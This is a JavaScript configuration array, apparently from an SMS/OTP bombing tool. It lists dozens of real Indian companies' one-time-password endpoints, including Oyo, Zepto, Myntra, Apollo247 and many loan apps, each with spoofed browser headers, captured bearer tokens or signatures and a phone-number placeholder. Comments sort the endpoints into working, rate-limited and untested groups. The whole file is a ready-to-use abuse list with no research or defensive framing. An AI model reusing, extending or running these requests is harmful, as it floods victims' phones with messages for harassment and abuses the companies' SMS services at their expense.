    { name: "Oyo_1", method: "POST", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "text/plain;charset=UTF-8", "accept": "*/*", "origin": "https://www.oyorooms.com", "referer": "https://www.oyorooms.com/login" }, data: { "phone": "{phone}", "country_code": "+91", "nod": 4 } },
    { name: "Ullu", method: "POST", url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}", headers: { "accept": "application/json, text/plain, */*", "origin": "https://ullu.app", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "referer": "https://ullu.app/" }, data: {} },
    { name: "Hungama OTP", url: "https://communication.api.hungama.com/v1/communication/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" }) },

    // ============================================================
    // 🆕 OLD NEW WORKING
    // ============================================================
    { name: "Gokwik_3", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers: { "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA", "Content-Type": "application/json", "gk-merchant-id": "19g6ilhej3mfc" }, data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "Gokwik_4", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers: { "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA", "Content-Type": "application/json", "gk-merchant-id": "19kc37zcdyiu" }, data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "Delhivery", method: "GET", url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "accept": "*/*" } },
    { name: "Vidyakul", method: "POST", url: "https://vidyakul.com/signup-otp/send", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: { "_raw": "phone={phone}&rcsconsent=true" } },

    // ============================================================
    // ⚠️ OLD RATE LIMITED
    // ============================================================
    { name: "Gokwik_1", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers: { "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo", "Content-Type": "application/json", "gk-merchant-id": "19g6im8srkz9y" }, data: (phone) => JSON.stringify({ phone: phone, country: "IN" }), rateLimit: true },
    { name: "Gokwik_2", method: "POST", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers: { "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8", "Content-Type": "application/json", "gk-merchant-id": "19an4fq2kk5y" }, data: (phone) => JSON.stringify({ phone: phone, country: "IN" }), rateLimit: true },
    { name: "ApolloPharmacy", method: "POST", url: "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: { "_raw": "mobile={phone}" }, rateLimit: true },
    { name: "Goibibo", method: "POST", url: "https://www.goibibo.com/common/downloadsms/", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: { "_raw": "mbl={phone}" }, rateLimit: true },
    { name: "Nuvama", method: "POST", url: "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ contactInfo: phone, mode: "SMS" }), rateLimit: true },
    { name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ country_code: "+91", phone: phone, app_signature: "Jc/Zu7qNqQ2" }), rateLimit: true },
    { name: "Jockey", method: "GET", url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "accept": "*/*" }, rateLimit: true },
    { name: "PharmEasy_NEW", method: "POST", url: "https://pharmeasy.in/api/auth/requestOTP", headers: { "Host": "pharmeasy.in", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0", "Accept": "*/*", "Content-Type": "application/json" }, data: { "contactNumber": "{phone}" }, rateLimit: true },

    // ============================================================
    // 🆕 NEW WORKING — 9 APIs
    // ============================================================
    { name: "JioSaavn", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0", method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" }, data: (phone) => JSON.stringify({ phone_number: "+91" + phone }) },
    { name: "Naaptol", url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp", method: "POST", headers: { "accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.naaptol.com", "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba", "referer": "https://www.naaptol.com/", "x-requested-with": "XMLHttpRequest" }, data: (phone) => JSON.stringify({ actionname: "checkMobileUserExistsForTvApp", mobile: phone }) },
    { name: "Zepto", url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" }, data: (phone) => JSON.stringify({ mobileNumber: phone }) },
    { name: "TradeIndia", url: "https://apis.tradeindia.com/app_login_api/login_app", method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json" }, data: (phone) => JSON.stringify({ mobile: "+91" + phone }) },
    { name: "Factori", url: "https://factori.com/login/check_user_exists", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "origin": "https://factori.com", "referer": "https://factori.com/my-account" }, data: { "_raw": "mobNumber={phone}&countryCode=91" } },
    { name: "Smytten", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ phone: phone, email: "test@example.com" }) },
    { name: "Tata Capital Business", url: "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" }) },
    { name: "Gokwik", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" }, data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },
    { name: "BharatLoan", url: "https://www.bharatloan.com/login-sbm", method: "POST", headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.bharatloan.com", "Referer": "https://www.bharatloan.com/apply-now", "X-Requested-With": "XMLHttpRequest" }, data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" } },

    // ============================================================
    // ⚠️ NEW RATE LIMITED
    // ============================================================
    { name: "AyushmanLoan", url: "https://backend.ayushmanloan.com/api/user/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://ayushmanloan.com", "Referer": "https://ayushmanloan.com/" }, data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "F1SpeedLoan", url: "https://backend.f1speedloan.com/api/user/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://f1speedloan.com", "Referer": "https://f1speedloan.com/" }, data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "RojgarKaro_Signup", url: "https://rojgarkaro.in/api/auth/sendOTPOnSignup", method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://rojgarkaro.in", "Referer": "https://rojgarkaro.in/signup" }, data: (phone) => JSON.stringify({ mobile_no: phone, email_id: "test@gmail.com", isSessionActive: false }), rateLimit: true },
    { name: "Udaan", url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", method: "POST", headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "origin": "https://auth.udaan.com", "x-app-id": "udaan-auth" }, data: { "_raw": "mobile={phone}" }, rateLimit: true },
    { name: "PocketCredit", url: "https://pocketcredit.in/api/auth/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://pocketcredit.in", "Referer": "https://pocketcredit.in/auth" }, data: (phone) => JSON.stringify({ mobile: phone }), rateLimit: true },
    { name: "Pagarbook", url: "https://api.pagarbook.com/api/v5/auth/otp/request", method: "POST", headers: { "accept": "application/json, text/plain, */*", "appversioncode": "5268", "clientbuildnumber": "5268", "clientplatform": "WEB", "content-type": "application/json", "origin": "https://web.pagarbook.com", "referer": "https://web.pagarbook.com/", "userrole": "EMPLOYER" }, data: (phone) => JSON.stringify({ phone: phone, language: 1 }), rateLimit: true },

    // ============================================================
    // 🔥 NAYI UNTESTED APIs
    // ============================================================
    { name: "Vedantu_New", url: "https://user.vedantu.com/user/preLoginVerification", method: "POST", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" }, data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false }) },
    { name: "IndiaMart_New", url: "https://m.indiamart.com/ajaxrequest/identified/common/login", method: "POST", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://m.indiamart.com", "referer": "https://m.indiamart.com/login/" }, data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone }) },
    { name: "JioSaavn_NEW", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0", method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" }, data: (phone) => JSON.stringify({ phone_number: "+91" + phone }) },
    { name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` }) },
    { name: "Vidyakul_New", url: "https://vidyakul.com/signup-otp/send", method: "POST", headers: { "accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://vidyakul.com", "referer": "https://vidyakul.com/class-12th/test-series", "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx", "x-requested-with": "XMLHttpRequest" }, data: { "_raw": "phone={phone}" } },
    { name: "Moglix", url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://www.moglix.com", "referer": "https://www.moglix.com/" }, data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" }) },
    { name: "AstroSage", url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank", method: "GET", headers: { "accept": "*/*", "referer": "https://www.astrosage.com/" } },
    { name: "55Club", url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode", method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json;charset=UTF-8", "origin": "https://55club08.in", "referer": "https://55club08.in/" }, data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 }) },
    { name: "TataCapital_Retail", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", method: "POST", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/" }, data: (phone) => JSON.stringify({ header: { authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli" }, body: { mobileNumber: phone } }) },
    { name: "Animall", url: "https://animall.in/zap/auth/login", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" }) },
    { name: "Swipe", url: "https://app.getswipe.in/api/user/mobile_login", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ mobile: phone, resend: true }) },
    { name: "Myntra", url: "https://www.myntra.com/gateway/v1/auth/getotp", method: "POST", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f", "x-myntraweb": "Yes", "x-requested-with": "browser", "x-location-context": "pincode=276304;source=IP", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" }, data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" }) },
    { name: "Wrogn", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST", headers: { "accept": "*/*", "action": "sendOTP", "content-type": "application/json", "origin": "https://wrogn.com", "referer": "https://wrogn.com/", "shop_name": "wrogn-website.myshopify.com" }, data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" }) },
    { name: "Entri", url: "https://entri.app/api/v3/users/check-phone/", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ phone: phone }) },
    { name: "UdyogPlus", url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", method: "POST", headers: { "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://udyogplus.adityabirlacapital.com", "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded", "X-Requested-With": "XMLHttpRequest" }, data: { "_raw": "MobileNumber={phone}&functionality=signup" } },
    { name: "RelianceRetail_New", url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp", method: "POST", headers: { "accept": "application/json", "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzczMzE3Nzg4LCJzYWx0IjowfQ.DLFEXcyozGInRiLn3U2dTGQEwTog6UYc3WP62ujmJGY", "content-type": "application/json", "origin": "https://account.relianceretail.com", "referer": "https://account.relianceretail.com/" }, data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "Licious", url: "https://www.licious.in/api/login/signup", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://www.licious.in", "Referer": "https://www.licious.in/" }, data: (phone) => JSON.stringify({ phone: phone, captcha_token: null }) },
    { name: "Aakash_Anthe", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp", method: "POST", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.aakash.ac.in", "referer": "https://www.aakash.ac.in/", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763" }, data: (phone) => JSON.stringify({ mobile_psid: phone, mobile_number: "", activity_type: "aakash-myadmission", webengageData: { profile: "student", whatsapp_opt_in: true, method: "mobile" } }) },
    { name: "Tyreplex", url: "https://www.tyreplex.com/includes/ajax/gfend.php", method: "POST", headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.tyreplex.com", "Referer": "https://www.tyreplex.com/login", "X-Requested-With": "XMLHttpRequest" }, data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" } },
    { name: "ServeTel", url: "https://api.servetel.in/v1/auth/otp", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=utf-8" }, data: { "_raw": "mobile_number={phone}" } },
    { name: "IIFL", url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", method: "POST", headers: { "accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.iifl.com", "referer": "https://www.iifl.com/personal-loans", "x-requested-with": "XMLHttpRequest" }, data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" } },
    { name: "CityMall_Web", url: "https://citymall.live/web-api/auth/send-otp", method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "host": "citymall.live", "origin": "https://citymall.live", "referer": "https://citymall.live/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" }, data: (phone) => JSON.stringify({ phone_number: phone }) },
    { name: "Gokwik_New", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", method: "POST", headers: { "accept": "application/json, text/plain, */*", "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3MzMxODk3NiwiZXhwIjoxNzczMzE5MDM2fQ.JzLZU2gjI0EBtokMC08rF20PCf4nL-NxxmoxXzHb6Dc", "content-type": "application/json", "gk-merchant-id": "19g6ilhzwnelw", "gk-platform": "shopify", "gk-request-id": "44fa696d-db10-4fb4-8b31-84baaeb0c3aa", "gk-signature": "394259", "gk-timestamp": "59110632", "gk-udf-1": "4479", "gk-version": "20260305172819153", "origin": "https://pdp.gokwik.co", "referer": "https://pdp.gokwik.co/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" }, data: (phone) => JSON.stringify({ phone: phone, country: "IN" }) },

    // ============================================================
    // 🚫 NAYI RATE LIMITED
    // ============================================================
    { name: "RojgarKaro_SendOTP", url: "https://rojgarkaro.in/api/auth/sendOTP", method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://rojgarkaro.in", "Referer": "https://rojgarkaro.in/" }, data: (phone) => JSON.stringify({ mobile_no: phone, isSessionActive: false }), rateLimit: true },
    { name: "FundsBull", url: "https://backend.fundsbull.com/api/user/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://fundsbull.com", "Referer": "https://fundsbull.com/" }, data: (phone) => JSON.stringify({ phone_number: phone }), rateLimit: true },
    { name: "Penpencil_GetOTP", url: "https://api.penpencil.co/v1/users/get-otp", method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "client": "hasura", "client_type": "WEB", "origin": "https://store.pw.live", "referer": "https://store.pw.live/", "randomid": "d6c503fb-9ed9-ee6d-ddde-319d99b08793", "suborgid": "SUB-PWST002", "version": "0.0.1" }, data: (phone) => JSON.stringify({ username: phone, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" }), rateLimit: true },
    { name: "NoBroker_OTP", url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", method: "POST", headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.nobroker.in", "referer": "https://www.nobroker.in/" }, data: { "_raw": "phone=%2B91{phone}" }, rateLimit: true },
    { name: "Moneyview", url: "https://pwa.gw.moneyview.in/uis/pwa/generate-otp", method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymR7z7x8fbdmHNVcw", "Origin": "https://moneyview.in", "Referer": "https://moneyview.in/" }, data: (phone) => `------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="key"\r\n\r\nMOBILE\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n${phone}\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw\r\nContent-Disposition: form-data; name="source"\r\n\r\npwa\r\n------WebKitFormBoundarymR7z7x8fbdmHNVcw--\r\n`, rateLimit: true },
    { name: "SalaryBolt", url: "https://backend.salarybolt.com/api/user/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "origin": "https://salarybolt.com", "referer": "https://salarybolt.com/" }, data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "Penpencil_Resend", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", method: "POST", headers: { "accept": "*/*", "content-type": "application/json", "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9", "origin": "https://www.pw.live", "referer": "https://www.pw.live/" }, data: (phone) => JSON.stringify({ mobile: phone, organizationId: "5eb393ee95fab7468a79d189" }), rateLimit: true },
    { name: "Cosmofeed", url: "https://prod.api.cosmofeed.com/api/user/authenticate", method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3", "origin": "https://superprofile.bio", "referer": "https://superprofile.bio/" }, data: (phone) => JSON.stringify({ phoneNumber: phone, countryCode: "+91", data: { email: "abcd2@gmail.com" }, authScreen: "signup-screen", userIsConvertingToCreator: false }), rateLimit: true },
    { name: "Sephora", url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869", method: "POST", headers: { "Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==", "x-fp-signature": "v1.1:82658e094becb14ba6a75fcca29dd5e7f1cb0767978485c12185178ff7ad198b", "x-fp-date": "20260108T112314Z", "x-fp-sdk-version": "3.3.2", "Origin": "https://sephora.in", "Referer": "https://sephora.in/" }, data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" }), rateLimit: true },
    { name: "BlinkrLoan", url: "https://backend.blinkrloan.com/api/user/v3/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "withCredentials": "true", "Origin": "https://www.blinkrloan.com", "Referer": "https://www.blinkrloan.com/" }, data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" }), rateLimit: true },
    { name: "FundoBaba", url: "https://backend.fundobaba.com/api/user/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://fundobaba.com", "Referer": "https://fundobaba.com/" }, data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "DuniyaFinance", url: "https://backend.duniyafinance.in/api/user/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://duniyafinance.com", "Referer": "https://duniyafinance.com/" }, data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "RupeeRedee", url: "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "applicationid": "", "deviceid": "abc-uuid", "platform": "Web", "origin": "https://www.rupeeredee.com", "referer": "https://www.rupeeredee.com/" }, data: (phone) => JSON.stringify({ number: "+91" + phone, type: "Mobile" }), rateLimit: true },
    { name: "NaukriLoans", url: "https://backend.naukriloans.com/api/user/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://naukriloans.com", "Referer": "https://naukriloans.com/" }, data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },
    { name: "Apollo247", url: "https://apigateway.apollo247.in/auth-service/generateOtp", method: "POST", headers: { "accept": "application/json, text/plain, */*", "authorization": "Bearer 3d1833da7020e0602165529446587434", "content-type": "application/json", "origin": "https://www.apollopharmacy.in", "referer": "https://www.apollopharmacy.in/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", "x-apollo-pre-auth-key": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZGVudGlmaWVyIjoiYTExN2NjMmZiMWIzMzAzZDhlOGY1NWZmMzBiNWUxMWY1YmZmZTFlMzFkMzcyZmM5MzJiNDc1MDk1NTIyYTFlZSIsImlzc3VlZEF0IjoxNzczMzE5MzQzODMyLCJkZXZpY2VJZCI6IkRlc2t0b3AiLCJpc3MiOiJBcG9sbG8yNDciLCJpYXQiOjE3NzMzMTkzNDMsImV4cCI6MTc3MzQwNTc0M30.CoFcO8xi4TS5ztxK2M7EvUrky2lBYcGbwN6yYP0JbRk8nqdEYLuD9TO1xNSVOGZ3z2DtiSfRQO7Zx1ih_LU1ZEwqxu_DIcj2snkYOAHxEStP5CmURJ3mzFmykfZTb-0ijfCnHKRdBGyZYqyXSaim3ruh-DEcHJGMTAS4CB4hTo7OQx4LffBFQiRPvqLL3jP0en-2dH_ZVVUz5cEEcvQ7SUW1pb8zHP99eOVlYSIxy5R_e8DtqxXnyehHf6Tz2KAMRGnT177yL7i8yB3JviHVksO5tKLUMwdSVA8_4WquIiUX3F0TsELdHwbQtojKID7E4oFojnP0O7J4Dr9kpdBW-g", "x-app-device-id": "Desktop", "x-app-os": "web" }, data: (phone) => JSON.stringify({ loginType: "PATIENT", mobileNumber: "+91" + phone }), rateLimit: true },
    { name: "1MG_New", url: "https://www.1mg.com/pwa-dweb-api/auth/create_token", method: "POST", headers: { "accept": "application/vnd.healthkartplus.v4+json", "content-type": "application/json", "hkp-platform": "Healthkartplus-0.0.1-desktopweb", "locale": "en", "origin": "https://www.1mg.com", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", "visitor-id": "3db32040-6706-4b0a-b063-8aa5fa55b224_zkmwX3acYQ_0579_1773319167588", "x-1mglabs-platform": "dWeb", "x-access-key": "1mg_client_access_key", "x-city": "New Delhi", "x-platform": "desktop-0.0.1", "x-visitor-id": "3db32040-6706-4b0a-b063-8aa5fa55b224_zkmwX3acYQ_0579_1773319167588" }, data: (phone) => JSON.stringify({ phone: phone }), rateLimit: true },
    { name: "Penpencil_Register", url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", method: "POST", headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.pw.live", "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f" }, data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", subOrgId: "SUB-PWLI000" }), rateLimit: true },

    // ============================================================
    // 🆕 NAYI 8 APIs
    // ============================================================
    { name: "SabkaLoan", url: "https://api.sabkaloan.com/api/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://sabkaloan.com", "Referer": "https://sabkaloan.com/" }, data: (phone) => JSON.stringify({ mobile: phone }) },
